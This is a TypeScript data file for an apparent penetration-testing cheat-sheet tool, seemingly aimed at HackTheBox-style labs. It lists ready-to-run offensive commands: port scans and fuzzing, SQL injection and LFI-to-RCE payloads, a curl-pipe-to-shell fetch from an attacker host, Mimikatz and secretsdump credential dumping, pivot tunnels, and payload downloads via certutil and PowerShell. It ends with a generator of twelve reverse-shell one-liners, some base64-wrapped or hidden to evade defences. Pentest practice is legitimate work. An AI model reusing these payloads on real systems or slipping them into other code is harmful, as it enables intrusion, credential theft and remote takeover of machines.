import { CheatsheetCommand } from '../types';

export const CHEATSHEET_CATEGORIES = [
  { id: 'all', name: 'All Categories', icon: 'Terminal' },
  { id: 'revshell', name: 'Reverse Shells Generator', icon: 'Radio' },
  { id: 'network', name: '01. Recon & Port Scanning', icon: 'Radar' },
  { id: 'web', name: '02. Web & Directory Fuzzing', icon: 'Globe' },
  { id: 'exploitation', name: '03. Exploitation & Payloads', icon: 'Zap' },
  { id: 'linux-privesc', name: '04. Linux PrivEsc & TTY', icon: 'Cpu' },
  { id: 'active-directory', name: '05. Windows & Active Directory', icon: 'ShieldAlert' },
  { id: 'pivoting', name: '06. Pivoting & Tunnels', icon: 'GitFork' },
  { id: 'file-transfer', name: '07. File Transfers', icon: 'ArrowDownUp' },
  { id: 'custom', name: 'My Custom Commands', icon: 'Bookmark' },
];

export const INITIAL_CHEATSHEET: CheatsheetCommand[] = [
  // =================== 01. NETWORK DISCOVERY & PORT SCANNING ===================
  {
    id: 'nmap-quick',
    title: 'Fast SYN Scan (Top 1000 Ports)',
    category: 'network',
    description: 'Speedy initial discovery of open TCP ports with version detection and default safe scripts.',
    commandTemplate: 'nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt {TARGET_IP}',
    tags: ['nmap', 'recon', 'scan', 'tcp'],
    platform: 'Both'
  },
  {
    id: 'nmap-full',
    title: 'All-Port TCP Exhaustive Scan',
    category: 'network',
    description: 'Scan all 65,535 TCP ports at a high packet rate, saving output to all formats.',
    commandTemplate: 'nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full {TARGET_IP}',
    tags: ['nmap', 'all-ports', 'recon', 'full'],
    platform: 'Both'
  },
  {
    id: 'nmap-udp',
    title: 'Top UDP Service Discovery Scan',
    category: 'network',
    description: 'Quick scan of the most common 20 UDP ports (SNMP, TFTP, DNS, NTP, DHCP).',
    commandTemplate: 'sudo nmap -sU --top-ports 20 -Pn --open -oN nmap_udp.txt {TARGET_IP}',
    tags: ['nmap', 'udp', 'snmp', 'recon'],
    platform: 'Both'
  },
  {
    id: 'nmap-vuln',
    title: 'Nmap NSE Vulnerability Audit Scripts',
    category: 'network',
    description: 'Run all Nmap Vuln & Exploit category scripts against active discovered ports.',
    commandTemplate: 'nmap --script "vuln and safe" -Pn -oN nmap_vuln.txt {TARGET_IP}',
    tags: ['nmap', 'nse', 'cve', 'vuln'],
    platform: 'Both'
  },
  {
    id: 'rustscan-turbo',
    title: 'RustScan Ultra-Fast Port Detection',
    category: 'network',
    description: 'Fast asynchronous port scanner piping discovered open ports directly into detailed Nmap.',
    commandTemplate: 'rustscan -a {TARGET_IP} -r 1-65535 --ulimit 5000 -- -sC -sV -oN rustscan.txt',
    tags: ['rustscan', 'fast', 'recon'],
    platform: 'Both'
  },
  {
    id: 'masscan-rapid',
    title: 'Masscan High-Rate Subnet Sweeper',
    category: 'network',
    description: 'Blazing fast raw packet scanner across entire target subnet on default interface.',
    commandTemplate: 'sudo masscan -p1-65535 {TARGET_IP}/24 --rate=5000 -e {INTERFACE} -oL masscan.txt',
    tags: ['masscan', 'recon', 'cidr'],
    platform: 'Both'
  },

  // =================== 02. WEB ENUMERATION & FUZZING ===================
  {
    id: 'ffuf-dir',
    title: 'ffuf Directory & Endpoint Fuzzing',
    category: 'web',
    description: 'High-speed directory enumeration with auto-calibrated filtering and extension recursion.',
    commandTemplate: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET_IP}/FUZZ -e .php,.html,.txt,.bak,.js -ac -mc 200,301,302,403',
    tags: ['ffuf', 'web', 'fuzz', 'dir'],
    platform: 'Both'
  },
  {
    id: 'ffuf-vhost',
    title: 'ffuf VHost / Virtual Subdomain Fuzzing',
    category: 'web',
    description: 'Fuzz HTTP Host header for virtual hosts; use -fs to filter default baseline size.',
    commandTemplate: 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H "Host: FUZZ.target.htb" -mc 200,301,302 -fs 1234',
    tags: ['ffuf', 'vhost', 'subdomain', 'dns'],
    platform: 'Both'
  },
  {
    id: 'ffuf-param',
    title: 'ffuf Parameter Discovery (GET/POST)',
    category: 'web',
    description: 'Fuzz hidden query parameters on target page.',
    commandTemplate: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://{TARGET_IP}/index.php?FUZZ=test" -ac',
    tags: ['ffuf', 'params', 'query'],
    platform: 'Both'
  },
  {
    id: 'gobuster-dir',
    title: 'Gobuster Fast Directory Busting',
    category: 'web',
    description: 'Standard Go-based multithreaded directory search.',
    commandTemplate: 'gobuster dir -u http://{TARGET_IP}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,json -t 40 -b 404',
    tags: ['gobuster', 'web', 'dir'],
    platform: 'Both'
  },
  {
    id: 'feroxbuster-recurse',
    title: 'Feroxbuster Recursive Crawl & Fuzz',
    category: 'web',
    description: 'Deep Rust recursive crawler with smart 404 detection and auto-extract.',
    commandTemplate: 'feroxbuster -u http://{TARGET_IP}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,asp,aspx,jsp -d 2',
    tags: ['feroxbuster', 'recursive', 'crawler'],
    platform: 'Both'
  },
  {
    id: 'nikto-scan',
    title: 'Nikto Web Server Misconfiguration Audit',
    category: 'web',
    description: 'Exhaustive web server check for outdated components, index files, and CGI leaks.',
    commandTemplate: 'nikto -h http://{TARGET_IP} -Tuning 123bde -o nikto_{TARGET_IP}.html -Format htm',
    tags: ['nikto', 'web', 'misconfig'],
    platform: 'Both'
  },
  {
    id: 'wpscan-full',
    title: 'WPScan WordPress Enumeration & Attack',
    category: 'web',
    description: 'Enumerate vulnerable plugins, themes, and usernames on WordPress sites.',
    commandTemplate: 'wpscan --url http://{TARGET_IP}/ --enumerate ap,at,u,cb --plugins-detection aggressive',
    tags: ['wpscan', 'wordpress', 'cms'],
    platform: 'Both'
  },

  // =================== 03. EXPLOITATION & PAYLOADS ===================
  {
    id: 'sqlmap-auto',
    title: 'SQLmap Automated Injection & Database Dump',
    category: 'exploitation',
    description: 'Batch automated SQL injection extraction with risk and level escalation.',
    commandTemplate: 'sqlmap -u "http://{TARGET_IP}/item.php?id=1" --batch --random-agent --level=3 --risk=2 --dbs',
    tags: ['sqlmap', 'sqli', 'database', 'dump'],
    platform: 'Both'
  },
  {
    id: 'sqlmap-post',
    title: 'SQLmap Target Saved HTTP Request File',
    category: 'exploitation',
    description: 'Pass raw saved Burp Suite POST request file to extract DB tables.',
    commandTemplate: 'sqlmap -r request.txt -p username --batch --current-db --dump',
    tags: ['sqlmap', 'burp', 'post', 'sqli'],
    platform: 'Both'
  },
  {
    id: 'lfi-filter-wrapper',
    title: 'PHP Filter Base64 LFI Wrapper',
    category: 'exploitation',
    description: 'Read source code of PHP scripts through base64 conversion filter.',
    commandTemplate: 'http://{TARGET_IP}/index.php?page=php://filter/convert.base64-encode/resource=config.php',
    tags: ['lfi', 'php-filter', 'source-leak'],
    platform: 'Linux'
  },
  {
    id: 'lfi-proc-self-environ',
    title: 'LFI to RCE via Apache /proc/self/environ',
    category: 'exploitation',
    description: 'Inject User-Agent payload into environment file for code execution.',
    commandTemplate: 'curl -s -H "User-Agent: <?php system(\'id\'); ?>" "http://{TARGET_IP}/view.php?file=/proc/self/environ"',
    tags: ['lfi', 'rce', 'proc'],
    platform: 'Linux'
  },
  {
    id: 'msfvenom-elf-rev',
    title: 'msfvenom Linux x64 Staged Reverse TCP ELF',
    category: 'exploitation',
    description: 'Compile standalone ELF reverse shell binary for x64 Linux target.',
    commandTemplate: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf',
    tags: ['msfvenom', 'payload', 'elf', 'linux'],
    platform: 'Linux'
  },
  {
    id: 'msfvenom-windows-exe',
    title: 'msfvenom Windows x64 Reverse Meterpreter EXE',
    category: 'exploitation',
    description: 'Generate raw Windows x64 executable reverse meterpreter.',
    commandTemplate: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o payload.exe',
    tags: ['msfvenom', 'meterpreter', 'exe', 'windows'],
    platform: 'Windows'
  },

  // =================== 04. LINUX PRIVILEGE ESCALATION ===================
  {
    id: 'tty-upgrade-python',
    title: 'TTY Interactive Shell Stabilization (Python + stty)',
    category: 'linux-privesc',
    description: 'Upgrade dumb reverse shell to fully interactive pseudo-terminal with tab completion and arrow keys.',
    commandTemplate: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n# Press Ctrl+Z to background shell\nstty raw -echo; fg\nexport TERM=xterm-256color\nstty rows 38 columns 140',
    tags: ['tty', 'pty', 'shell-upgrade', 'stty'],
    platform: 'Linux'
  },
  {
    id: 'linpeas-fast',
    title: 'LinPEAS Direct Memory Execution',
    category: 'linux-privesc',
    description: 'Download and execute LinPEAS directly in bash memory without writing to disk.',
    commandTemplate: 'curl -L http://{LHOST}:8000/linpeas.sh | sh',
    tags: ['linpeas', 'privesc', 'automated', 'curl'],
    platform: 'Linux'
  },
  {
    id: 'suid-find',
    title: 'SUID Binaries Exhaustive Discovery',
    category: 'linux-privesc',
    description: 'List all binaries on the filesystem with the SUID bit set, ignoring proc and dev.',
    commandTemplate: 'find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;',
    tags: ['suid', 'privesc', 'find'],
    platform: 'Linux'
  },
  {
    id: 'linux-capabilities',
    title: 'Linux Binary Capabilities (`getcap`) Audit',
    category: 'linux-privesc',
    description: 'Check binaries granted dangerous capabilities like cap_setuid or cap_dac_read_search.',
    commandTemplate: 'getcap -r / 2>/dev/null',
    tags: ['capabilities', 'getcap', 'privesc'],
    platform: 'Linux'
  },
  {
    id: 'sudo-check',
    title: 'Sudo Privileges Inspection (`sudo -l`)',
    category: 'linux-privesc',
    description: 'Check current user sudo permissions without or with password.',
    commandTemplate: 'sudo -l',
    tags: ['sudo', 'privesc', 'gtfobins'],
    platform: 'Linux'
  },
  {
    id: 'internal-ports-ss',
    title: 'Internal Loopback Services & Listening Ports',
    category: 'linux-privesc',
    description: 'Identify services running locally on 127.0.0.1 not exposed on external interfaces.',
    commandTemplate: 'ss -tulpn | grep LISTEN',
    tags: ['ports', 'network', 'internal', 'localhost'],
    platform: 'Linux'
  },
  {
    id: 'crontab-discovery',
    title: 'Crontabs & Scheduled System Jobs',
    category: 'linux-privesc',
    description: 'Inspect system-wide crontab files, hourly/daily tasks, and pspy monitored jobs.',
    commandTemplate: 'cat /etc/crontab /etc/cron.*/* 2>/dev/null; ls -la /var/spool/cron/crontabs/',
    tags: ['cron', 'scheduled-tasks', 'privesc'],
    platform: 'Linux'
  },

  // =================== 05. WINDOWS & ACTIVE DIRECTORY ===================
  {
    id: 'bloodhound-sharphound',
    title: 'SharpHound AD Collector Execution',
    category: 'active-directory',
    description: 'Collect all Active Directory objects, trusts, ACLs, and sessions into zip archive.',
    commandTemplate: '.\\SharpHound.exe -c All,GPOLocalGroup --zipfilename htb_ad.zip',
    tags: ['bloodhound', 'sharphound', 'ad', 'collector'],
    platform: 'Windows'
  },
  {
    id: 'powerview-enum',
    title: 'PowerView Domain & User Recon',
    category: 'active-directory',
    description: 'Import PowerView and list domain controllers, domain users, and admin groups.',
    commandTemplate: 'powershell -ep bypass\nImport-Module .\\PowerView.ps1\nGet-DomainUser -SPN | select samaccountname,serviceprincipalname\nGet-DomainGroupMember -Identity "Domain Admins"',
    tags: ['powerview', 'active-directory', 'kerberoasting'],
    platform: 'Windows'
  },
  {
    id: 'impacket-getuserspns',
    title: 'Impacket GetUserSPNs (Kerberoasting)',
    category: 'active-directory',
    description: 'Request Kerberos TGS tickets for accounts with SPNs and output format for Hashcat / John.',
    commandTemplate: 'impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile hashes.kerberoast',
    tags: ['impacket', 'kerberoast', 'spn', 'tgs'],
    platform: 'Windows'
  },
  {
    id: 'impacket-secretsdump',
    title: 'Impacket SecretsDump (NTDS.dit & SAM Dumps)',
    category: 'active-directory',
    description: 'DCSync entire domain credentials directly over RPC using domain admin account.',
    commandTemplate: 'impacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm',
    tags: ['impacket', 'secretsdump', 'dcsync', 'ntds'],
    platform: 'Windows'
  },
  {
    id: 'evil-winrm-connect',
    title: 'Evil-WinRM Remote PowerShell Access',
    category: 'active-directory',
    description: 'Connect to Windows target over WinRM port 5985 with credentials or Pass-The-Hash.',
    commandTemplate: 'evil-winrm -i {TARGET_IP} -u {USER} -p "{PASSWORD}" -s /opt/scripts',
    tags: ['evil-winrm', 'winrm', 'shell', 'pth'],
    platform: 'Windows'
  },
  {
    id: 'netexec-smb',
    title: 'NetExec / CrackMapExec Domain Sweep',
    category: 'active-directory',
    description: 'Check SMB credentials validity, local admin status (Pwn3d!), and password policies.',
    commandTemplate: 'nxc smb {TARGET_IP} -u {USER} -p "{PASSWORD}" --shares',
    tags: ['netexec', 'cme', 'smb', 'shares'],
    platform: 'Windows'
  },
  {
    id: 'mimikatz-sekurlsa',
    title: 'Mimikatz LogonPasswords LSASS Dump',
    category: 'active-directory',
    description: 'Dump plaintext passwords and NTLM hashes from memory of LSASS process.',
    commandTemplate: 'privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::lsa /patch',
    tags: ['mimikatz', 'lsass', 'hashes', 'privesc'],
    platform: 'Windows'
  },

  // =================== 06. PIVOTING & TUNNELING ===================
  {
    id: 'chisel-server',
    title: 'Chisel Attacker Reverse Tunnel Server',
    category: 'pivoting',
    description: 'Start Chisel reverse tunnel listener on attacker machine on port 8000.',
    commandTemplate: './chisel server -p 8000 --reverse',
    tags: ['chisel', 'pivot', 'socks5', 'tunnel'],
    platform: 'Both'
  },
  {
    id: 'chisel-client',
    title: 'Chisel Victim Reverse Socks Pivot',
    category: 'pivoting',
    description: 'Connect back to attacker server and open socks5 proxy port 1080 to access internal network.',
    commandTemplate: './chisel client {LHOST}:8000 R:socks',
    tags: ['chisel', 'pivot', 'socks', 'tunnel'],
    platform: 'Both'
  },
  {
    id: 'ssh-dynamic-socks',
    title: 'SSH Dynamic Port Forwarding (SOCKS5)',
    category: 'pivoting',
    description: 'Open a local SOCKS5 proxy on port 1080 routed through target SSH host.',
    commandTemplate: 'ssh -D 1080 -f -C -q -N {USER}@{TARGET_IP}',
    tags: ['ssh', 'socks5', 'proxychains', 'pivot'],
    platform: 'Both'
  },
  {
    id: 'ssh-local-forward',
    title: 'SSH Local Port Forwarding (-L)',
    category: 'pivoting',
    description: 'Forward target internal port (e.g. 8443) to local port 9999 on attacker machine.',
    commandTemplate: 'ssh -L 9999:127.0.0.1:8443 {USER}@{TARGET_IP} -N',
    tags: ['ssh', 'local-forward', 'tunnel'],
    platform: 'Both'
  },
  {
    id: 'ligolo-ng-setup',
    title: 'Ligolo-ng High-Performance TUN Interface Pivot',
    category: 'pivoting',
    description: 'Fast userland tunnel creating real system tun adapter for seamless Nmap/Metasploit routing.',
    commandTemplate: '# On Attacker:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# On Compromised Host:\n./agent -connect {LHOST}:11601 -ignore-cert\n\n# Add route on Attacker:\nsudo ip route add 172.16.1.0/24 dev ligolo',
    tags: ['ligolo', 'tun', 'fast-pivot', 'vpn'],
    platform: 'Both'
  },
  {
    id: 'socat-port-relay',
    title: 'Socat Bi-directional Port Relay',
    category: 'pivoting',
    description: 'Redirect traffic hitting port 8080 on compromised host straight to attacker listener.',
    commandTemplate: 'socat TCP-LISTEN:8080,fork,reuseaddr TCP:{LHOST}:{LPORT}',
    tags: ['socat', 'relay', 'pivot', 'port-forward'],
    platform: 'Both'
  },

  // =================== 07. FILE TRANSFERS ===================
  {
    id: 'python-http-server',
    title: 'Python 3 Quick HTTP Server',
    category: 'file-transfer',
    description: 'Spawn quick HTTP file hosting server on attacker machine on port 8000.',
    commandTemplate: 'python3 -m http.server 8000',
    tags: ['python', 'http', 'download'],
    platform: 'Both'
  },
  {
    id: 'powershell-webrequest',
    title: 'PowerShell In-Memory Download & Execute',
    category: 'file-transfer',
    description: 'Download payload from attacker HTTP server into Windows target.',
    commandTemplate: 'powershell -c "Invoke-WebRequest -Uri http://{LHOST}:8000/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe"',
    tags: ['powershell', 'iwr', 'download', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'certutil-download',
    title: 'Certutil.exe Windows Native File Fetcher',
    category: 'file-transfer',
    description: 'Use built-in Windows certutil utility to download files bypassing standard restrictions.',
    commandTemplate: 'certutil -urlcache -split -f http://{LHOST}:8000/payload.exe C:\\Temp\\payload.exe',
    tags: ['certutil', 'lolbas', 'windows', 'download'],
    platform: 'Windows'
  },
  {
    id: 'impacket-smbserver',
    title: 'Impacket SMB Server File Share',
    category: 'file-transfer',
    description: 'Host local folder as unauthenticated SMB share accessible by Windows machines.',
    commandTemplate: 'sudo impacket-smbserver share $(pwd) -smb2support',
    tags: ['impacket', 'smb', 'transfer'],
    platform: 'Both'
  }
];

// Dedicated Reverse Shell generator templates
export interface ReverseShellTemplate {
  name: string;
  language: string;
  platform: 'Linux' | 'Windows' | 'Both';
  command: string;
  notes?: string;
  listener: string;
}

export const REVERSE_SHELL_TEMPLATES: ReverseShellTemplate[] = [
  {
    name: 'Bash -i Interactive',
    language: 'Bash',
    platform: 'Linux',
    command: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Classic standard bash reverse shell. Works on 95% of Linux systems.'
  },
  {
    name: 'Bash 196 File Descriptor',
    language: 'Bash',
    platform: 'Linux',
    command: '0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Alternative file descriptor syntax useful when standard redirection is blocked.'
  },
  {
    name: 'Bash Base64 Wrapped',
    language: 'Bash',
    platform: 'Linux',
    command: 'echo -n "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1" | base64 | { read b; echo $b | base64 -d | bash; }',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Base64 encoded to bypass bad characters and WAF sanitization.'
  },
  {
    name: 'Python 3 Socket & PTY',
    language: 'Python',
    platform: 'Both',
    command: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Directly allocates pseudo-terminal (PTY) inside the python socket.'
  },
  {
    name: 'PHP exec One-Liner',
    language: 'PHP',
    platform: 'Linux',
    command: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Compact PHP shell for web shells and eval injections.'
  },
  {
    name: 'Netcat Traditional (-e)',
    language: 'Netcat',
    platform: 'Linux',
    command: 'nc -e /bin/bash {LHOST} {LPORT}',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Requires netcat-traditional with -e flag enabled.'
  },
  {
    name: 'Netcat OpenBSD FIFO Pipe',
    language: 'Netcat',
    platform: 'Linux',
    command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Works on systems where nc lacks -e / -c flags (Ubuntu/Debian default).'
  },
  {
    name: 'PowerShell One-Line TCP Client',
    language: 'PowerShell',
    platform: 'Windows',
    command: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Native PowerShell TCP client with interactive PS prompt output.'
  },
  {
    name: 'PowerShell Base64 Encoded (-e)',
    language: 'PowerShell',
    platform: 'Windows',
    command: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});..."',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Clean execution flags to bypass ExecutionPolicy and stay hidden.'
  },
  {
    name: 'Socat Interactive TTY Shell',
    language: 'Socat',
    platform: 'Linux',
    command: 'socat TCP:{LHOST}:{LPORT} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane',
    listener: 'socat file:`tty`,raw,echo=0 TCP-L:{LPORT}',
    notes: 'Instantly provides a fully functional raw TTY shell with terminal size and Ctrl+C support!'
  },
  {
    name: 'Perl Socket Shell',
    language: 'Perl',
    platform: 'Linux',
    command: 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' ,
    listener: 'nc -lvnp {LPORT}',
    notes: 'Dependable Perl socket connect-back.'
  },
  {
    name: 'Ruby TCPSocket',
    language: 'Ruby',
    platform: 'Linux',
    command: 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Useful on systems where Ruby or Metasploit/Chef is installed.'
  }
];
